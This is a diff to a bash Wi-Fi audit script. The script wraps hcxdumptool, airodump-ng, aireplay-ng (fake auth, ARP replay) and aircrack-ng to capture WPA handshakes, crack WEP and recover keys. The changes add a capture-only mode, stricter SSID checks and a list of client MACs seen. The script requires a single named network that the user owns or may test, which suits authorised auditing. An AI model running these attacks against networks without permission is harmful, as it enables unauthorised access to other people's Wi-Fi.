@@ -421,7 +421,7 @@ hcx_is_v7() { hcxdumptool -h 2>&1 | grep -q -- '--bpfc'; }
 
 capture_hcx() {
     local iface=$1 bssid=$2 timeout_s=$3 freq=$4 active=$5 out=$6 log=$7
-    local minutes=$(( (timeout_s + 59) / 60 ))
+    local minutes=$(( (timeout_s + 59) / 60 )) mode=passive
     if hcx_is_v7; then
         local -a args=(-i "$iface" -w "$out" --tot="$minutes" --exitoneapol=3)
         [ -n "$freq" ] && [ "$freq" != 0 ] && [ "$freq" != "?" ] && args+=(-f "$freq")
@@ -493,7 +493,7 @@ wep_attack() {
     local mon; mon=$(start_monitor "$iface"); MON_IFACE=$mon
     local cap="$RUN/wep"
     info "airodump-ng on $mon, channel $channel"
-    airodump-ng --ivs -w "$cap" --bssid "$bssid" -c "$channel" "$mon" >"$RUN/airodump.log" 2>&1 &
+    airodump-ng --ivs -w "$cap" --bssid "$bssid" -c "$channel" "$mon" >/dev/null 2>"$RUN/airodump.err" &
     AIRODUMP_PID=$!
     sleep 6
     info "aireplay-ng fake auth + ARP replay"
@@ -515,7 +515,7 @@ legacy_handshake() {
     local mon; mon=$(start_monitor "$iface"); MON_IFACE=$mon
     local cap="$RUN/handshake"
     info "airodump-ng on $mon ($bssid ch $channel)"
-    airodump-ng -w "$cap" --bssid "$bssid" -c "$channel" "$mon" >"$RUN/airodump.log" 2>&1 &
+    airodump-ng -w "$cap" --bssid "$bssid" -c "$channel" "$mon" >/dev/null 2>"$RUN/airodump.err" &
     AIRODUMP_PID=$!
     sleep 5
     if [ "$deauth" = 1 ]; then
@@ -537,6 +537,10 @@ legacy_handshake() {
     wait 2>/dev/null || true
     capfile=$(ls "$RUN"/handshake-*.cap 2>/dev/null | head -n1)
     [ -n "$capfile" ] || { warn "no capture file"; return 1; }
+    if [ "$wordlist" = /dev/null ]; then
+        info "capture-only run; keeping $capfile for later cracking"
+        return 1
+    fi
     info "aircrack-ng against $(basename "$capfile")"
     aircrack-ng -w "$wordlist" -b "$bssid" "$capfile" 2>&1 | tee "$RUN/aircrack.log" >/dev/null
     awk -F: '/KEY FOUND/{gsub(/ /,"",$2); print $2}' "$RUN/aircrack.log" | tail -n1
@@ -579,7 +583,8 @@ cmd_attack() {
     done
 
     [ -n "$ssid" ] || die "--ssid is required (the network name you own or may test)"
-    printf '%s' "$ssid" | grep -qP '^[\x20-\x7e]{1,32}$' || die "invalid SSID"
+    [ "$(printf '%s' "$ssid" | wc -c)" -le 32 ] || die "SSID longer than 32 bytes"
+    printf '%s' "$ssid" | LC_ALL=C grep -q '[[:cntrl:]]' && die "SSID contains control characters"
     case "$ssid" in *'*'*|*'?'*) die "wildcards are not allowed; name one network" ;; esac
     [[ "$timeout_s" =~ ^[0-9]+$ ]] && [ "$timeout_s" -ge 30 ] && [ "$timeout_s" -le 3600 ] \
         || die "--timeout must be 30..3600 seconds"
@@ -680,16 +685,22 @@ cmd_attack() {
             psk=$(wep_attack "$iface" "$bssid" "$channel" "$timeout_s") ;;
     esac
 
+    local clients=""
+    clients=$(awk -F, '/Station MAC/{f=1; next} f && NF {gsub(/^ +| +$/, "", $1); if ($1 != "") print $1}' "$RUN"/handshake-*.csv 2>/dev/null | tr '\n' ' ')
     {
         printf '# Wi-Fi audit: %s\n\n' "$ssid"
         printf '- BSSID: `%s`\n- Channel: %s\n- Security: %s\n' "$bssid" "$channel" "$security"
         printf '- Adapter: `%s` (%s)\n- Method: %s (%s)\n' "$iface" "$(driver_of "$iface")" "$method" "$(tool_for_method "$method")"
         printf '- Started: %s\n- Capture: `%s`\n' "$(date -Is)" "${hashfile#$RUN/}"
+        printf '- Clients seen: %s\n' "${clients:-none}"
         if [ -n "$psk" ]; then printf '\n**Key recovered:** `%s`\n' "$psk"; else printf '\n**Result:** no key recovered in this run.\n'; fi
         printf '\n## Files\n\n'
         ls -1 "$RUN" | sed 's/^/- /'
     } >"$RUN/summary.md"
     printf '%s\t%s\t%s\t%s\t%s\t%s\n' "$(date -Is)" "$ssid" "$bssid" "$method" "${psk:-none}" "$RUN" >>"$BBT_DIR/history.tsv"
+    if [ -n "${SUDO_USER:-}" ] && [ "$SUDO_USER" != root ]; then
+        chown -R "$SUDO_USER":"$(id -gn "$SUDO_USER" 2>/dev/null || echo "$SUDO_USER")" "$RUN" 2>/dev/null || true
+    fi
 
     if [ -n "$psk" ]; then
         printf '\n%s[+] KEY RECOVERED:%s %s\n' "$GREEN" "$OFF" "$psk"
